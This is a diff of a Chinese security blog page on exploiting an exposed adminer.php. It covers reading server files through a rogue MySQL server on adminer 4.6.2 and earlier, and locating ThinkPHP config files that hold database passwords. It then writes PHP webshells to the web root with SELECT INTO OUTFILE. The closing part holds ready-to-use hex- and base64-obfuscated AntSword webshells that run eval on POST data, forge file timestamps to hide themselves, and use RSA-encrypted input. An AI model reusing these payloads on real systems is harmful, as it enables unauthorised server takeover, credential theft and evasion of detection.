@@ -142,9 +142,9 @@ MathJax = {
         
       </div>
       <div class="markdown-body">
-        <h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>某次项目中遇到扫目录中奖了adminer.php，所以对adminer的利用做个 小总结。</p>
+        <h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>某次项目中遇到扫目录中奖了adminer.php，所以对adminer的利用做个小总结。</p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="确定admirer版本"><a href="#确定admirer版本" class="headerlink" title="确定admirer版本"></a>确定admirer版本</h3><p>adminer的大概界面一般如下图，可以通过界面获取版本信息。</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206112601729.png" alt="image-20211206112601729"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206112601729.png" alt="image-20211206112601729"></p>
 <p>而<strong>admirer&lt;&#x3D;4.6.2</strong>时，可以利用mysql的”LOAD DATA LOCAL INFILE”特性读取mysql客户端代码，当利用adminer去访问我们搭建的恶意mysql服务器，就可以读到adminer服务器上的任意源码。</p>
 <h3 id="搭建恶意mysql服务器"><a href="#搭建恶意mysql服务器" class="headerlink" title="搭建恶意mysql服务器"></a>搭建恶意mysql服务器</h3><h4 id="MySQL-Fake-Server"><a href="#MySQL-Fake-Server" class="headerlink" title="MySQL_Fake_Server"></a>MySQL_Fake_Server</h4><p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
 <p>python3写的，实战中跑起来后没有读到文件。</p>
@@ -175,22 +175,22 @@ MathJax = {
 
 <h3 id="利用php框架获取网站相对路径"><a href="#利用php框架获取网站相对路径" class="headerlink" title="利用php框架获取网站相对路径"></a>利用php框架获取网站相对路径</h3><p>因为本文章讨论的是adminer.php，网站一定是php的，所以可以先判断网站有无使用一些知名框架，如thinkphp,Laravel,yii等框架。即目标网站的文件路径可以参考对应php框架目录，下面以一次thinkphp 5.0.20实战案例为例</p>
 <h5 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h5><p>扫目录发现目标存在adminer.php，且访问LICENSE.txt文件和页面报错可判断框架为thinkphp框架</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206143702220.png" alt="image-20211206143702220"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206143702220.png" alt="image-20211206143702220"></p>
 <p>读文件判断操作系统，发现是windows系统，尝试读icon cache失败，即不能通过上面介绍的方法获得web服务的绝对路径</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144247785.png" alt="image-20211206144247785"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144247785.png" alt="image-20211206144247785"></p>
 <p>尝试用adminer读取index.php(不管什么框架，有无二开，index.php文件都是我们可以通过黑盒观察目录结构判断到其相对于adminer.php的相对路径的,即该文件是一定能读到的)</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206143957915.png" alt="image-20211206143957915"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206143957915.png" alt="image-20211206143957915"></p>
 <p>读index.php中写到的thinkphp&#x2F;start.php,提示thinkphp的引导文件是base.php</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144926139.png" alt="image-20211206144926139"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144926139.png" alt="image-20211206144926139"></p>
 <p>读thinkphp&#x2F;base.php,该文件可以查看到thinkphp各模块对应目录，以及thinkphp版本等信息</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206145050899.png" alt="image-20211206145050899"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206145050899.png" alt="image-20211206145050899"></p>
 <p>尝试读index.php中提到的build.php可以看到应用配置文件common.php,config.php,database.php</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144815798.png" alt="image-20211206144815798"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206144815798.png" alt="image-20211206144815798"></p>
 <p>一般的thinkphp应用目录是application,而本次这个目标的index.php中写了应用目录是apps，所以正确的配置文件路径是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apps/common.php</span><br><span class="line">apps/config.php</span><br><span class="line">apps/database.php</span><br></pre></td></tr></table></figure>
 
 <p>成功读到数据库账号密码，可以登录adminer后台</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206145520230.png" alt="image-20211206145520230"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211206145520230.png" alt="image-20211206145520230"></p>
 <h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">遇到thinkphp5可关注的高价值文件</span><br><span class="line">index.php</span><br><span class="line">build.php</span><br><span class="line">thinkphp/base.php		thinkphp引导文件</span><br><span class="line">apps/common.php</span><br><span class="line">apps/config.php</span><br><span class="line">apps/database.php</span><br><span class="line">application/common.php</span><br><span class="line">application/config.php</span><br><span class="line">application/database.php</span><br></pre></td></tr></table></figure>
 
 <h3 id="adminer后台战法"><a href="#adminer后台战法" class="headerlink" title="adminer后台战法"></a>adminer后台战法</h3><p>利用思路和拿到数据库权限怎么getshell的思路一致</p>
@@ -216,11 +216,11 @@ MathJax = {
 <p>例如当我们尝试写入最简单的一个有换行符和制表符shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x3c3f7068700a096576616c28245f504f53545b2278646464646464646464225d3b0a3f3e into outfile &#x27;C:\\phpstudy_pro\\WWW\\xddddddddd.php&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211207144724913.png" alt="image-20211207144724913"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211207144724913.png" alt="image-20211207144724913"></p>
 <p>可以发现换行符0a的部分还被额外增加了一个\符号，且制表符处也增加了一个\符号，严重破坏了shell的文件结构。</p>
 <p>不过经测试outfile下仍有**能正常用的换行符0d(即\r)**，所以我们手动把所有0a换行符换成0d就能正常写入换行的shell。</p>
 <p>但是这并非万能的，虽然肉眼甚至一些diff下用\r替换\n做换行符后没啥区别，但一些情景例如某些加密需要用到公钥私钥，而公钥私钥中的换行符，如果我们强行替换到\r，会破坏其的格式导致其报错，所以对于一些使用公钥私钥的shell目前我仍没找到在outfile下直接写入他们的思路，只能使用file_put_contents的思路去写.</p>
-<p><img src="/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211207145229122.png" alt="image-20211207145229122"></p>
+<p><img src="/2022/04/13/%E4%B8%80%E6%AC%A1adminer%E4%B9%8B%E6%97%85/image-20211207145229122.png" alt="image-20211207145229122"></p>
 <p>一些储备的poc</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#写入log_time的蚁剑马</span><br><span class="line">select 0x3c3f70687020646174655f64656661756c745f74696d657a6f6e655f736574282250524322293b20246b65793d6d643528646174652822592d6d2d6420483a69222c74696d65282929293b20636c61737320544553547b2066756e6374696f6e20656e636f646528246b6579297b204024706f73743d6261736536345f6465636f646528245f524551554553545b276c42445149626c5174275d293b20666f722824693d303b24693c7374726c656e2824706f7374293b24692b2b297b24706f73745b24695d203d2024706f73745b24695d205e20246b65795b24692533325d3b7d2072657475726e2024706f73743b7d2066756e6374696f6e20616e7428246461746129207b72657475726e206576616c2824746869732d3e656e636f6465282224646174612229293b7d207d2024746573743d6e657720544553543b2024746573742d3e616e7428246b6579293b20747279207b202466696c65203d207363616e64697228245f5345525645525b27444f43554d454e545f524f4f54275d293b20666f726561636820282466696c6520617320246e616d6529207b206966284066696c656374696d6528246e616d6529297b207661725f64756d702866696c656374696d6528246e616d6529293b207661725f64756d7028246e616d65293b207661725f64756d70284066696c656374696d65285f5f46494c455f5f29293b20746f756368285f5f46494c455f5f2c66696c656374696d6528246e616d6529293b20746f75636828246e616d652c4066696c656374696d65285f5f46494c455f5f29293b207661725f64756d70284066696c656374696d65285f5f46494c455f5f29293b20627265616b3b207d207d207d2063617463682028457863657074696f6e20246529207b206563686f2022636f6e6669672069732077726f6e6721223b207d203f3e into outfile &#x27;C:\\phpstudy_pro\\WWW\\log_time.php&#x27;</span><br><span class="line">#在同级目录生成Statementh.class.php的蚁剑log_aes马</span><br><span class="line">select &#x27;&lt;?php file_put_contents(&quot;Statementh.class.php&quot;,base64_decode(&quot;PD9waHAKdHJ5IHsKICAgICRmaWxlID0gc2NhbmRpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKICAgIGZvcmVhY2ggKCRmaWxlIGFzICRuYW1lKSB7CiAgICAgICAgaWYoQGZpbGVjdGltZSgkbmFtZSkpewogICAgICAgICAgICAvL2NoYW5nZSB0aW1lCiAgICAgICAgICAgIHZhcl9kdW1wKGZpbGVjdGltZSgkbmFtZSkpOwogICAgICAgICAgICB2YXJfZHVtcCgkbmFtZSk7CiAgICAgICAgICAgIHZhcl9kdW1wKEBmaWxlY3RpbWUoX19GSUxFX18pKTsKICAgICAgICAgICAgdG91Y2goX19GSUxFX18sZmlsZWN0aW1lKCRuYW1lKSk7CiAgICAgICAgICAgIHRvdWNoKCRuYW1lLEBmaWxlY3RpbWUoX19GSUxFX18pKTsKICAgICAgICAgICAgdmFyX2R1bXAoQGZpbGVjdGltZShfX0ZJTEVfXykpOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9Cn0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgZWNobyAiY29uZmlnIGlzIHdyb25nISI7Cn0KaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSl7CglwcmludCAnbm9zc2wnOwp9CmVsc2V7CiRieXRlPSYkYmlsbHBhc3M7CkAkYmlsbHBhc3M9JF9QT1NUWydsQkRRSWJsUXQnXTsKJHBhc3MgPSAmJGJ5dGU7CiRwayA9IDw8PEVPRgotLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQpNSUdmTUEwR0NTcUdTSWIzRFFFQkFRVUFBNEdOQURDQmlRS0JnUURWeVdNM25pWk53T250N0RkeG1WQzE4TFRPCnp6WDVBOWFaSEJiQWxLQyt1Ty9rbDEwV0I2VENKSmxvRSs1eWlVMHM4d1p0SzlucVk4RkxjMkJqVWRtbi82bTcKTVJiSlFTM0tmdkZkakhmR05aQ0J3blU2VERLQ0UwcWQ3WGNZYW15NlAwSGZyMnkxSnBRcUp0QWZIRFMwMlRLSwpXaVp1QmdYS1lNa1YxQk5aMHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCkVPRjsKJGFyciA9IGV4cGxvZGUoInwiLCAkcGFzcyk7CiRwayA9IG9wZW5zc2xfcGtleV9nZXRfcHVibGljKCRwayk7CiRwYXNzID0gJyc7CmZvcmVhY2ggKCRhcnIgYXMgJHZhbHVlKSB7CiAgaWYgKG9wZW5zc2xfcHVibGljX2RlY3J5cHQoYmFzZTY0X2RlY29kZSgkdmFsdWUpLCAkZGUsICRwaykpIHsKICAgICRwYXNzIC49ICRkZTsKICB9Cn0KZm9yZWFjaCgkX1BPU1QgYXMgJGsgPT4gJHYpewogICAgaWYgKG9wZW5zc2xfcHVibGljX2RlY3J5cHQoYmFzZTY0X2RlY29kZSgkdiksICRkZSwgJHBrKSkgewogICAgICAgJF9QT1NUWyRrXT0kZGU7CiAgfQp9CmV2YWwoKGAvKip1c2VybmFtZT1saWp1bioqL2AuJHBhc3MuYC8qKnRva2VuPTgxMjA1NzIxMDM4MSoqL2ApKTsKfQo/Pg==&quot;));?&gt;&#x27; into outfile &#x27;C:\\phpstudy_pro\\WWW\\1.php&#x27;</span><br></pre></td></tr></table></figure>
 
